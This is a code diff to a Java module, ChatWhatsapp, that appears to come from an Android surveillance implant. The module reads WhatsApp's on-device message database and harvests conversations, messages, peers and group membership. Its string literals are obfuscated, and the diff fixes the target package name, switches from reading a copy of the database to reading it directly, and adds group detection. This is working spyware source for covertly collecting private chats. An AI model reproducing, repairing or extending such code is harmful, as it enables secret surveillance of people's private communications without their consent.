@@ -38,7 +38,7 @@ public class ChatWhatsapp extends SubModuleChat {
 	private static final int PROGRAM = 0x06;
 
 	private static final String DEFAULT_LOCAL_NUMBER = "local";
-	String pObserving = M.e("whatsapp");
+	String pObserving = M.e("com.whatsapp");
 
 	private String myPhoneNumber = DEFAULT_LOCAL_NUMBER;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
@@ -209,12 +209,15 @@ public class ChatWhatsapp extends SubModuleChat {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readChatMessages): can read DB");
 				}
-				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
+				GenericSqliteHelper helper = GenericSqliteHelper.open(dbDir, dbFile);
 				SQLiteDatabase db = helper.getReadableDatabase();
 
 				// retrieve a list of all the conversation changed from the last
 				// reading. Each conversation contains the peer and the last id
 				ArrayList<Pair<String, Integer>> changedConversations = fetchChangedConversation(db);
+				//helper.deleteDb();
+				
+				//helper = GenericSqliteHelper.open(dbDir, dbFile);
 
 				// for every conversation, fetch and save message and update
 				// markup
@@ -223,7 +226,7 @@ public class ChatWhatsapp extends SubModuleChat {
 					int lastReadIndex = pair.second;
 
 					if (groups.isGroup(conversation) && !groups.hasMemoizedGroup(conversation)) {
-						fetchGroup(db, conversation);
+						fetchGroup(helper, conversation);
 					}
 
 					int newLastRead = fetchMessages(db, conversation, lastReadIndex);
@@ -248,6 +251,7 @@ public class ChatWhatsapp extends SubModuleChat {
 				}
 
 				db.close();
+				//helper.deleteDb();
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
@@ -258,7 +262,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		}
 	}
 
-	private void fetchGroup(SQLiteDatabase db, final String conversation) {
+	private void fetchGroup(GenericSqliteHelper helper, final String conversation) {
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (fetchGroup) : " + conversation);
@@ -286,9 +290,7 @@ public class ChatWhatsapp extends SubModuleChat {
 			}
 		};
 
-		GenericSqliteHelper helper = new GenericSqliteHelper(db);
-		// f_a = messages
-		helper.traverseRecords(M.e("messages"), visitor);
+		helper.traverseRecords(M.e("messages"), visitor, false);
 
 	}
 
@@ -455,6 +457,14 @@ public class ChatWhatsapp extends SubModuleChat {
 		}
 		// f_9=@s.whatsapp.net
 		return remote.replaceAll(M.e("@s.whatsapp.net"), "");
+	}
+	
+	public class ChatWhatsappGroups extends ChatGroups {
+		@Override
+		boolean isGroup(String peer) {
+			return peer.contains("@g.");
+		}
+
 	}
 
 }
